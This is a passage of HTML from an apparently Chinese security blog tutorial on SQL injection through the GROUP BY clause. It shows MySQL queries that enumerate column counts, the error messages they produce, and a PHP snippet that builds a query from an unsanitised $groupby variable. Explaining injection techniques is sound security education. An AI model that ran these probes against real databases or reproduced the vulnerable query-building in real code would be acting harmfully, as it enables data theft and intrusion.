+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="获取字段数" class="heading-element"><span>获取字段数</span>
+  <a href="#%e8%8e%b7%e5%8f%96%e5%ad%97%e6%ae%b5%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>group by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生如下报错：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+--------+------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+--------+------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+--------+------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">02</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1054</span><span class="w"> </span><span class="p">(</span><span class="mi">42</span><span class="n">S22</span><span class="p">):</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;6&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;group statement&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739401.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739401.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739401.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739401.png?size=large 2x" data-title="图片" style="--width: 1016px;--aspect-ratio: 1016 / 296;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>还有一种报错情况，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">5</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1055</span><span class="w"> </span><span class="p">(</span><span class="mi">42000</span><span class="p">):</span><span class="w"> </span><span class="n">Expression</span><span class="w"> </span><span class="o">#</span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">clause</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">contains</span><span class="w"> </span><span class="n">nonaggregated</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;security.users.id&#39;</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">functionally</span><span class="w"> </span><span class="n">dependent</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">clause</span><span class="p">;</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">incompatible</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">sql_mode</span><span class="o">=</span><span class="n">only_full_group_by</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1055</span><span class="w"> </span><span class="p">(</span><span class="mi">42000</span><span class="p">):</span><span class="w"> </span><span class="n">Expression</span><span class="w"> </span><span class="o">#</span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">clause</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">contains</span><span class="w"> </span><span class="n">nonaggregated</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;security.users.id&#39;</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">functionally</span><span class="w"> </span><span class="n">dependent</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">clause</span><span class="p">;</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">incompatible</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">sql_mode</span><span class="o">=</span><span class="n">only_full_group_by</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1054</span><span class="w"> </span><span class="p">(</span><span class="mi">42</span><span class="n">S22</span><span class="p">):</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;4&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;group statement&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739798.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739798.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739798.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739798.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 432;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个错误提示是由于MySQL的<code>sql_mode</code>配置中启用了<code>only_full_group_by</code>模式，它要求在使用<code>GROUP BY</code>子句时，SELECT列表中的非聚合列必须包含在GROUP BY子句中。</p>
+<p>上述案例中id是非聚合列，所以必须要带上，如下：</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739667.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739667.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739667.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739667.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 762;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>还有一种情况， group by后面的参数只能控制一部分，比如如下sql语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;select * from users where username like &#39;admin%&#39; group by user.</span><span class="si">$groupby</span><span class="s2"> &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>像案例中就是这种情况，这种情况下获取列名只能先闭合前面的列名，然后遍历第二位的数字，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">5</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="mi">4</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1054</span><span class="w"> </span><span class="p">(</span><span class="mi">42</span><span class="n">S22</span><span class="p">):</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;4&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;group statement&#39;</span></span></span></code></pre></td></tr></table>
+</div>
